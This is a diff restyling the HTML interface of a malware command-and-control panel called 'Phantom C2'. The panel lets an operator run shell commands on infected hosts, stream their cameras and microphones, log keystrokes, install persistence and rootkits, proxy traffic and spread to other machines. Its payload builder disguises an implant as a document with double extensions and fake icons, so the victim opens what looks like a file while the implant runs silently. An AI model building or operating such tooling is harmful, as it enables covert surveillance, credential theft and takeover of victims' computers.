@@ -1,5 +1,5 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -7,243 +7,272 @@
   <link rel="stylesheet" href="/style.css">
 </head>
 <body>
-<header>
-  <h1>PHANTOM<span class="sub">C2</span></h1>
-  <nav>
-    <button data-tab="ops" class="on">Operations</button>
-    <button data-tab="build">Builder</button>
+<div class="app">
+  <nav class="rail">
+    <div class="brand">P</div>
+    <button data-tab="ops" class="on" title="Operations" aria-label="Operations">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+        <rect x="3" y="4" width="18" height="7" rx="2"/><rect x="3" y="14" width="18" height="6" rx="2"/>
+        <circle cx="7" cy="7.5" r=".9" fill="currentColor"/><circle cx="7" cy="17" r=".9" fill="currentColor"/>
+      </svg>
+    </button>
+    <button data-tab="build" title="Builder" aria-label="Builder">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+        <path d="M12 3l8 4.5v9L12 21l-8-4.5v-9L12 3z"/><path d="M12 12l8-4.5M12 12v9M12 12L4 7.5"/>
+      </svg>
+    </button>
+    <span class="spacer"></span>
   </nav>
-  <div id="status">disconnected</div>
-</header>
 
-<main id="ops" class="tab on">
-  <aside>
-    <div class="aside-head">
-      <input id="search" placeholder="filter…">
-      <select id="sort">
-        <option value="name">name</option>
-        <option value="ip">ip</option>
-        <option value="seen">last seen</option>
-      </select>
-    </div>
-    <div class="aside-head">
-      <label><input type="checkbox" id="selectall"> all</label>
-      <span id="count">0 bots</span>
-      <button id="export" class="mini">export</button>
-    </div>
-    <ul id="sessions"></ul>
-  </aside>
+  <div class="workspace">
+    <header class="topbar">
+      <h1>Phantom C2</h1>
+      <span class="pill" id="status">disconnected</span>
+      <span class="spacer"></span>
+      <span class="pill" id="count">0 hosts</span>
+    </header>
 
-  <section id="panel">
-    <div class="bcast">
-      <select id="btype">
-        <option value="shell">shell</option>
-        <option value="lsjson">lsjson</option>
-        <option value="sysinfo">sysinfo</option>
-        <option value="ps">ps</option>
-        <option value="screenshot">screenshot</option>
-        <option value="cam_stream">cam live</option>
-        <option value="mic_stream">mic live</option>
-        <option value="persist">persist</option>
-        <option value="rootkit">rootkit</option>
-        <option value="socks">socks</option>
-        <option value="keylog">keylog</option>
-        <option value="scan">scan</option>
-        <option value="spread">spread</option>
-        <option value="kill">kill</option>
-      </select>
-      <input id="bcmd" placeholder="command (for shell / path)">
-      <button id="bgo">Broadcast &#9654;</button>
-      <span id="bstatus"></span>
-    </div>
+    <main id="ops" class="tab ops on">
+      <aside class="hosts">
+        <div class="hosts-head">
+          <input id="search" placeholder="filter hosts…">
+          <select id="sort">
+            <option value="name">name</option>
+            <option value="ip">ip</option>
+            <option value="seen">last seen</option>
+          </select>
+        </div>
+        <div class="hosts-meta">
+          <label class="switch"><input type="checkbox" id="selectall"></label>
+          <span>all</span>
+          <span class="spacer"></span>
+          <button id="export" class="mini">export</button>
+        </div>
+        <ul class="host-list" id="sessions"></ul>
+      </aside>
 
-    <div id="target">No target selected</div>
+      <section class="panel">
+        <div class="targetbar">
+          <span class="who" id="target">no host selected</span>
+          <span class="path" id="targetpath"></span>
+        </div>
 
-    <div class="quick" id="quick">
-      <button data-q="whoami">whoami</button>
-      <button data-q="ls">ls</button>
-      <button data-q="sysinfo">sysinfo</button>
-      <button data-q="ps">ps</button>
-      <button data-q="screenshot">screenshot</button>
-      <button data-q="cam">camera</button>
-      <button data-q="mic">mic</button>
-      <button data-q="persist">persist</button>
-      <button data-q="rootkit">rootkit</button>
-      <button data-q="socks">socks</button>
-      <button data-q="keylog start">keylog</button>
-      <button data-q="scan">scan</button>
-    </div>
+        <div class="actions">
+          <select id="btype">
+            <option value="shell">shell</option>
+            <option value="lsjson">list</option>
+            <option value="sysinfo">sysinfo</option>
+            <option value="ps">processes</option>
+            <option value="screenshot">screenshot</option>
+            <option value="cam_stream">camera live</option>
+            <option value="mic_stream">mic live</option>
+            <option value="persist">persist</option>
+            <option value="rootkit">rootkit</option>
+            <option value="socks">socks</option>
+            <option value="keylog">keylog</option>
+            <option value="scan">scan</option>
+            <option value="spread">spread</option>
+            <option value="kill">kill</option>
+          </select>
+          <input id="bcmd" class="grow" placeholder="command for every selected host…">
+          <button id="bgo" class="primary">Broadcast</button>
+          <span class="msg" id="bstatus"></span>
+        </div>
 
-    <div class="subtabs">
-      <button data-st="console" class="on">Console</button>
-      <button data-st="files">Files</button>
-      <button data-st="media">Media</button>
-      <button data-st="keylog">Keylog</button>
-      <button data-st="info">Info</button>
-    </div>
+        <div class="actions">
+          <button class="chip" data-q="whoami">whoami</button>
+          <button class="chip" data-q="ls">ls</button>
+          <button class="chip" data-q="sysinfo">sysinfo</button>
+          <button class="chip" data-q="ps">ps</button>
+          <button class="chip" data-q="screenshot">screen</button>
+          <button class="chip acc" data-q="cam">camera</button>
+          <button class="chip acc" data-q="mic">mic</button>
+          <button class="chip" data-q="persist">persist</button>
+          <button class="chip" data-q="rootkit">rootkit</button>
+          <button class="chip" data-q="socks">socks</button>
+          <button class="chip" data-q="keylog start">keylog</button>
+          <button class="chip" data-q="scan">scan</button>
+        </div>
 
-    <div id="console" class="subtab on">
-      <div id="term"></div>
-      <form id="cmdform">
-        <input id="cmd" placeholder="whoami" autocomplete="off" autofocus>
-        <select id="type">
-          <option value="shell">shell</option>
-          <option value="ls">ls</option>
-          <option value="lsjson">lsjson</option>
-          <option value="cat">cat</option>
-          <option value="sysinfo">sysinfo</option>
-          <option value="ps">ps</option>
-          <option value="download">download</option>
-          <option value="screenshot">screenshot</option>
-          <option value="webcam">webcam</option>
-          <option value="mic">mic</option>
-          <option value="cam_stream">cam live</option>
-          <option value="mic_stream">mic live</option>
-          <option value="persist">persist</option>
-          <option value="rootkit">rootkit</option>
-          <option value="socks">socks</option>
-          <option value="keylog">keylog</option>
-          <option value="scan">scan</option>
-          <option value="spread">spread</option>
-        </select>
-        <button>Run</button>
-        <button type="button" id="clear" class="mini">clear</button>
-      </form>
-    </div>
+        <div class="tabs">
+          <button data-st="console" class="on">Console</button>
+          <button data-st="files">Files</button>
+          <button data-st="media">Media</button>
+          <button data-st="keylog">Keylog</button>
+          <button data-st="info">Info</button>
+        </div>
 
-    <div id="files" class="subtab">
-      <div class="pathbar">
-        <input id="fpath" value=".">
-        <button id="flist">List</button>
-        <input id="fupload" type="file">
-        <button id="fup">Upload here</button>
-      </div>
-      <table id="ftable">
-        <thead><tr><th>name</th><th>size</th><th></th></tr></thead>
-        <tbody></tbody>
-      </table>
-    </div>
+        <div id="console" class="tabpane on">
+          <div class="term" id="term"></div>
+          <form class="composer" id="cmdform">
+            <input id="cmd" class="grow" placeholder="type a command and press enter" autocomplete="off" autofocus>
+            <select id="type">
+              <option value="shell">shell</option>
+              <option value="ls">ls</option>
+              <option value="lsjson">lsjson</option>
+              <option value="cat">cat</option>
+              <option value="sysinfo">sysinfo</option>
+              <option value="ps">ps</option>
+              <option value="download">download</option>
+              <option value="screenshot">screenshot</option>
+              <option value="webcam">webcam</option>
+              <option value="mic">mic</option>
+              <option value="cam_stream">cam live</option>
+              <option value="mic_stream">mic live</option>
+              <option value="persist">persist</option>
+              <option value="rootkit">rootkit</option>
+              <option value="socks">socks</option>
+              <option value="keylog">keylog</option>
+              <option value="scan">scan</option>
+              <option value="spread">spread</option>
+            </select>
+            <button class="primary">Run</button>
+            <button type="button" id="clear" class="ghost">clear</button>
+          </form>
+        </div>
 
-    <div id="media" class="subtab">
-      <div class="paths">
-        <div class="livebox">
-          <div class="livehead">
-            <strong>live camera</strong>
-            <div>
-              <select id="cam_fps">
-                <option value="1">1 fps</option>
-                <option value="2" selected>2 fps</option>
-                <option value="5">5 fps</option>
-                <option value="10">10 fps</option>
-              </select>
-              <button id="cam_on" class="mini">start</button>
-              <button id="cam_off" class="mini">stop</button>
+        <div id="files" class="tabpane">
+          <div class="pathbar">
+            <input id="fpath" class="grow" value=".">
+            <button id="flist" class="ghost">List</button>
+            <input id="fupload" type="file">
+            <button id="fup" class="ghost">Upload here</button>
+          </div>
+          <table id="ftable">
+            <thead><tr><th>name</th><th>size</th><th></th></tr></thead>
+            <tbody></tbody>
+          </table>
+        </div>
+
+        <div id="media" class="tabpane">
+          <div class="live">
+            <div class="card">
+              <div class="card-head">
+                <strong>Live camera</strong>
+                <span class="spacer"></span>
+                <select id="cam_fps" class="mini">
+                  <option value="1">1 fps</option>
+                  <option value="2" selected>2 fps</option>
+                  <option value="5">5 fps</option>
+                  <option value="10">10 fps</option>
+                </select>
+                <button id="cam_on" class="mini">start</button>
+                <button id="cam_off" class="mini">stop</button>
+              </div>
+              <div class="card-body">
+                <img id="camview" alt="camera stream">
+                <div class="sub2 meta" id="camstat">idle</div>
+              </div>
+            </div>
+            <div class="card">
+              <div class="card-head">
+                <strong>Live microphone</strong>
+                <span class="spacer"></span>
+                <button id="mic_on" class="mini">listen</button>
+                <button id="mic_off" class="mini">mute</button>
+              </div>
+              <div class="card-body">
+                <canvas id="micwave" height="84"></canvas>
+                <div class="meter"><i id="miclevel"></i></div>
+                <div class="meta" id="micstat">idle</div>
+              </div>
             </div>
           </div>
-          <img id="camview" alt="">
-          <div class="meta" id="camstat">idle</div>
-        </div>
-        <div class="livebox">
-          <div class="livehead">
-            <strong>live microphone</strong>
-            <div>
-              <button id="mic_on" class="mini">listen</button>
-              <button id="mic_off" class="mini">mute</button>
-            </div>
+          <div class="pathbar">
+            <button id="shot" class="ghost">screenshot</button>
+            <button id="snap" class="ghost">webcam snap</button>
+            <button id="recwav" class="ghost">mic clip 5s</button>
+            <span class="spacer"></span>
+            <button id="medclear" class="ghost">clear gallery</button>
           </div>
-          <canvas id="micwave" height="70"></canvas>
-          <div class="meta" id="micstat">idle</div>
+          <div class="gallery" id="mediaout"></div>
         </div>
+
+        <div id="keylog" class="tabpane">
+          <div class="pathbar">
+            <button id="klstart" class="ghost">start</button>
+            <button id="kldump" class="ghost">dump</button>
+            <button id="klclear" class="ghost">dump + clear</button>
+            <button id="klstop" class="ghost">stop</button>
+          </div>
+          <pre class="out" id="klout"></pre>
+        </div>
+
+        <div id="info" class="tabpane">
+          <div class="fieldrow">
+            <label class="inline">sleep <input id="i_sleep" type="number" value="3" min="1"></label>
+            <label class="inline">jitter <input id="i_jitter" type="number" value="20" min="0" max="90"></label>
+            <button id="i_set" class="ghost">apply</button>
+          </div>
+          <div class="fieldrow">
+            <input id="i_note" class="grow" placeholder="note…">
+            <input id="i_tags" placeholder="tags, comma, sep">
+            <button id="i_save" class="ghost">save</button>
+          </div>
+          <pre class="out" id="infoout"></pre>
+        </div>
+      </section>
+    </main>
+
+    <main id="build" class="tab">
+      <div class="builder">
+        <h2>Payload builder</h2>
+        <p class="sub">Drop any file and you get one launcher: the victim sees their
+          document, the implant runs silently behind it.</p>
+
+        <div class="dropzone" id="drop">
+          <input type="file" id="b_file">
+          <div id="dropmsg">
+            <div class="big">Drop a file or click to choose</div>
+            <div class="hint">pdf · docx · xlsx · zip · jpg · any file</div>
+          </div>
+        </div>
+
+        <div class="grid2">
+          <label>output name <input id="b_name" placeholder="invoice"></label>
+          <label>platform
+            <select id="b_os">
+              <option value="windows">windows</option>
+              <option value="linux">linux</option>
+              <option value="darwin">macOS</option>
+            </select>
+          </label>
+          <label>architecture
+            <select id="b_arch"><option>amd64</option><option>arm64</option><option>386</option></select>
+          </label>
+          <label>start delay (s) <input id="b_delay" type="number" value="0" min="0"></label>
+          <label class="wide">callback url
+            <span class="row">
+              <input id="b_url" placeholder="auto-detected">
+              <button type="button" class="ghost" id="b_autourl">auto</button>
+            </span>
+            <span class="hint" id="b_urlhint"></span>
+          </label>
+          <label>sleep (s) <input id="b_sleep" type="number" value="3" min="1"></label>
+          <label>jitter (%) <input id="b_jitter" type="number" value="20" min="0" max="90"></label>
+        </div>
+
+        <div class="switches">
+          <label class="switch"><input type="checkbox" id="b_double" checked> double extension</label>
+          <label class="switch"><input type="checkbox" id="b_icon" checked> document icon</label>
+          <label class="switch"><input type="checkbox" id="b_console"> console window</label>
+          <label class="switch"><input type="checkbox" id="b_fileless"> fileless .sh (linux)</label>
+        </div>
+
+        <div class="buildbar">
+          <button id="b_build" class="primary">Bind &amp; build</button>
+          <button id="b_raw" class="ghost">raw implant</button>
+          <span class="msg" id="b_msg"></span>
+        </div>
+
+        <ul class="artifacts" id="builds"></ul>
       </div>
-      <div class="pathbar">
-        <button id="shot" class="mini">screenshot</button>
-        <button id="snap" class="mini">webcam snap</button>
-        <button id="recwav" class="mini">mic clip 5s</button>
-        <button id="medclear" class="mini">clear</button>
-      </div>
-      <div id="mediaout"></div>
-    </div>
+    </main>
+  </div>
+</div>
 
-    <div id="keylog" class="subtab">
-      <div class="pathbar">
-        <button id="klstart">start</button>
-        <button id="kldump">dump</button>
-        <button id="klclear">dump+clear</button>
-        <button id="klstop">stop</button>
-      </div>
-      <pre id="klout"></pre>
-    </div>
-
-    <div id="info" class="subtab">
-      <div class="infobar">
-        <label>sleep <input id="i_sleep" type="number" value="3" min="1"></label>
-        <label>jitter <input id="i_jitter" type="number" value="20" min="0" max="90"></label>
-        <button id="i_set">apply</button>
-      </div>
-      <div class="infobar">
-        <input id="i_note" placeholder="note…">
-        <input id="i_tags" placeholder="tags, comma, sep">
-        <button id="i_save">save</button>
-      </div>
-      <pre id="infoout"></pre>
-    </div>
-  </section>
-</main>
-
-<main id="build" class="tab">
-  <section id="buildpanel">
-    <h2>Payload builder</h2>
-    <p class="hint">Drop any file below to get a single launcher: the victim sees
-      their PDF / DOCX / image, the implant runs silently behind it.</p>
-
-    <div id="drop" class="drop">
-      <input type="file" id="b_file">
-      <div id="dropmsg">drop a file here or click to choose<br>
-        <span class="meta">pdf · docx · xlsx · zip · jpg · any file</span></div>
-    </div>
-
-    <div class="grid">
-      <label>output name <input id="b_name" placeholder="invoice"></label>
-      <label>platform
-        <select id="b_os">
-          <option value="windows">windows</option>
-          <option value="linux">linux</option>
-          <option value="darwin">macOS</option>
-        </select>
-      </label>
-      <label>arch
-        <select id="b_arch"><option>amd64</option><option>arm64</option><option>386</option></select>
-      </label>
-      <label>start delay (s) <input id="b_delay" type="number" value="0" min="0"></label>
-      <label class="wide">callback url
-        <span class="urlrow">
-          <input id="b_url" placeholder="auto">
-          <button type="button" class="mini" id="b_autourl" title="auto-detect">auto</button>
-        </span>
-        <span class="meta" id="b_urlhint"></span>
-      </label>
-      <label>sleep (s) <input id="b_sleep" type="number" value="3" min="1"></label>
-      <label>jitter (%) <input id="b_jitter" type="number" value="20" min="0" max="90"></label>
-    </div>
-
-    <div class="opts">
-      <label class="chk"><input type="checkbox" id="b_double" checked> double extension (invoice.pdf.exe)</label>
-      <label class="chk"><input type="checkbox" id="b_icon" checked> document icon</label>
-      <label class="chk"><input type="checkbox" id="b_console"> keep console window</label>
-      <label class="chk"><input type="checkbox" id="b_fileless"> fileless .sh loader (linux)</label>
-    </div>
-
-    <button id="b_build">Bind &amp; build</button>
-    <button id="b_raw" class="mini">build raw implant</button>
-    <span id="b_msg"></span>
-
-    <h3>Artifacts</h3>
-    <ul id="builds"></ul>
-  </section>
-</main>
-
-<div id="toasts"></div>
-<div id="dlbar"><span>Downloads:</span><div id="dllist"></div></div>
+<div class="toasts" id="toasts"></div>
+<div class="dlbar"><span>downloads</span><div class="list" id="dllist"></div></div>
 
 <script src="/app.js"></script>
 </body>
